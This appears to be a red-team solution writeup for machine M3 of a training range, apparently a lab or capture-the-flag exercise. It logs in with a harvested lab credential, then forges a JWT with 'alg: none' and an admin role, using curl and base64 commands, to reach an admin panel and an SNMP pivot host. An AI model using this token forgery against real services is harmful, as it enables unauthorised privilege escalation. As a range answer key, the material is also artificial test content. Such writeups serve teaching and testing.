# solve_red.md — M3 · itgw-sso
## Red Team Solution Writeup
**Range:** RNG-IT-01 · Corporate Gateway
**Machine:** M3 — Staff Authentication Gateway
**Vulnerability:** JWT Algorithm Confusion (alg: none)
**MITRE ATT&CK:** T1606 (Forge Web Credentials) · T1078 (Valid Accounts)
**Severity:** Critical
**Kill Chain Stage:** Exploitation → Privilege Escalation

---

## Objective
Login to the Staff Authentication Gateway using the `svc-deploy-sso` credential obtained from M2. Analyse the issued JWT. Exploit JWT algorithm confusion to forge an admin-role token and access the admin infrastructure panel revealing the SNMP management host for M4.

---

## Environment
| Item | Value |
|---|---|
| Target IP | `203.x.x.x` |
| Service Port | `8443` |
| Credential (from M2) | `svc-deploy-sso : SSO@Prabal!2024` |

---

## Step-by-Step Exploitation

### Step 1 — Login with Harvested Credential

```bash
curl -s -c /tmp/sso_cookies.txt -X POST http://203.x.x.x:8443/login \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=svc-deploy-sso&password=SSO%40Prabal%212024" -L
```

On success, a `pul_staff_token` cookie is set containing a JWT. The portal displays the raw token split into its three Base64URL-encoded sections (header · payload · signature).

<img width="1229" height="1068" alt="image" src="https://github.com/user-attachments/assets/65963d78-2b90-4752-a64c-06115aa55675" />


### Step 2 — Decode the JWT

Extract the token from the cookie jar:
```bash
TOKEN=$(grep "pul_staff_token" /tmp/sso_cookies.txt | awk '{print $7}')
echo $TOKEN
```

Decode the header and payload (Base64URL — add padding as needed):
```bash
# Header (part 1)
echo $TOKEN | cut -d'.' -f1 | base64 -d 2>/dev/null || \
  echo $TOKEN | cut -d'.' -f1 | awk '{n=length($0)%4; if(n==2)printf "%s==", $0; else if(n==3)printf "%s=", $0; else print $0}' | base64 -d

# Payload (part 2)
echo $TOKEN | cut -d'.' -f2 | awk '{n=length($0)%4; if(n==2)printf "%s==", $0; else if(n==3)printf "%s=", $0; else print $0}' | base64 -d
```

**Decoded header:**
```json
{"alg": "HS256", "typ": "JWT"}
```

**Decoded payload:**
```json
{"sub": "svc-deploy-sso", "role": "analyst", "iat": 1731234567, "exp": 1731238167}
```
<img width="2321" height="952" alt="image" src="https://github.com/user-attachments/assets/b32a497f-34c0-4b7a-b050-e388b82002c1" />


### Step 3 — Forge Admin JWT with alg: none

The vulnerability: the server's `decode_jwt_vulnerable()` function checks the `alg` field from the header and, if it is `"none"`, skips signature verification entirely. We can forge a token with any payload.

**Build the forged token:**
```bash
# New header — alg: none
HEADER=$(echo -n '{"alg":"none","typ":"JWT"}' | base64 | tr '+/' '-_' | tr -d '=')

# New payload — role changed to admin
PAYLOAD=$(echo -n '{"sub":"svc-deploy-sso","role":"admin","iat":1731234567,"exp":9999999999}' | base64 | tr '+/' '-_' | tr -d '=')

# alg: none token has empty signature
FORGED_TOKEN="${HEADER}.${PAYLOAD}."

echo "Forged JWT: ${FORGED_TOKEN}"
```

<img width="2340" height="957" alt="image" src="https://github.com/user-attachments/assets/cf555715-fe74-4b02-9ce2-bb83fe69dd5d" />


### Step 4 — Submit Forged Token

```bash
curl -s -b "pul_staff_token=${FORGED_TOKEN}" \
  http://203.x.x.x:8443/staff-portal
```

<img width="970" height="615" alt="image" src="https://github.com/user-attachments/assets/f5c95449-5811-4429-b8cc-70f067502660" />


The server accepts the token (alg: none → no signature check), decodes the payload, reads `role: admin`, and renders the admin infrastructure panel.

### Step 5 — Extract M4 Pivot Artifact

The admin panel discloses:

| Field | Value |
|---|---|
| SNMP Host | `203.x.x.x` |
| SNMP Port | `161` |
| SNMP Version | `v2c` |
| Description | Network Management Host — SNMP polling agent |

This is the pivot artifact for **M4 — itgw-netmgmt**.

<img width="2519" height="1294" alt="image" src="https://github.com/user-attachments/assets/f0c4802e-6d9d-44f5-a651-6260f5a73228" />


---

## MITRE ATT&CK Mapping

| Tactic | Technique | ID |
|---|---|---|
| Credential Access | Forge Web Credentials | T1606 |
| Privilege Escalation | Valid Accounts | T1078 |
| Discovery | System Information Discovery | T1082 |
